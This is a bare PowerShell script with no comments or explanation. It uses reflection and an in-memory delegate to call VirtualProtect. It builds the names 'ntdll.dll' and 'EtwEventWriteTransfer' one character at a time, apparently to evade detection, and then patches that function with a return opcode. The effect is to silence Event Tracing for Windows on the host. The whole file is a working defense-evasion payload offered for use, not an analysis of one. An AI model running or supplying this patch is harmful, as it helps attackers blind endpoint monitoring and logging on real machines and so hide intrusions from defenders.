function LookupFunc { 
    Param ($moduleName, $functionName) 
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1]. 
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') 
    $tmp=@() 
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) 
} 
function getDelegateType { 
    Param ( 
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
    [Parameter(Position = 1)] [Type] $delType = [Void] 
    ) 
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false). 
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate]) 
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed') 
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func). 
    SetImplementationFlags('Runtime, Managed') 
    return $type.CreateType() 
} 
$dllvalue = "n"+"t"+"d"+"l"+"l"+"."+"d"+"l"+"l" 
$functionval = "E"+"t"+"w"+"E"+"v"+"e"+"n"+"t"+"W"+"r"+"i"+"t"+"e"+"T"+"r"+"a"+"n"+"s"+"f"+"e"+"r" 
[IntPtr]$funcAddr = LookupFunc $dllvalue $functionval 
$oldProtectionBuffer = 0  
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool]))) 
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 
$buf = [Byte[]] (0xc3, 0x00, 0x00, 0x00) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3) 
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
